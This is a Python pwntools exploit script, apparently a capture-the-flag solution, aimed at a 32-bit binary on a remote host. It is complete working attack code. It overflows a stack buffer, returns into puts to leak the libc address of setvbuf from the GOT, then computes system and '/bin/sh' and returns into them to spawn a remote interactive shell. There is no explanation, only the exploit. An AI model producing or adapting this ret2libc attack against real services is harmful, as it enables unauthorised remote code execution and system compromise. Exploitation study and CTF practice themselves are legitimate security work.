from pwn import *

context.log_level = 'DEBUG'

chunk = 40
p = remote('54.225.38.91', 1028)
drop = ELF('./main', False)
#libc = ELF('/usr/lib32/libc.so.6', False)
libc = ELF('./libc2.30.so', False)
def first_stage():
    puts_plt = p32(drop.plt['puts'])
    setvbuf_got = p32(drop.got['setvbuf'])
    _start = p32(drop.sym['_start'])
    payload = ('A' * chunk + puts_plt + _start + setvbuf_got).ljust(108, 'B') 
    with open('./in', 'wb') as f:
        f.write(payload)
    p.recvuntil('o/\n\n')
    p.sendline(payload)
    setvbuf_libc = u32(p.recv(4))
    scanf_libc = u32(p.recv(4))
    print("scanf_libc: " + hex(scanf_libc))
    return setvbuf_libc 

def second_stage(setvbuf):
    libc_base = setvbuf - libc.sym['setvbuf']
    system = p32(libc_base + libc.sym['system'])
    sh = p32(libc_base + next(libc.search('/bin/sh')))
    log.info("setvbuf:   " + hex(setvbuf))
    log.info("libc base: " + hex(libc_base))
    log.info("system:    " + hex(u32(system[::-1])))
    log.info("/bin/sh:   " + hex(u32(sh[::-1])))
    p.recvuntil('o/\n\n')
    payload = ('A' * (chunk - 0x10) + system + 'BBBB' + sh).ljust(108, 'C') 
    p.sendline(payload)
    p.interactive()

setvbuf = first_stage()
second_stage(setvbuf)
p.interactive()
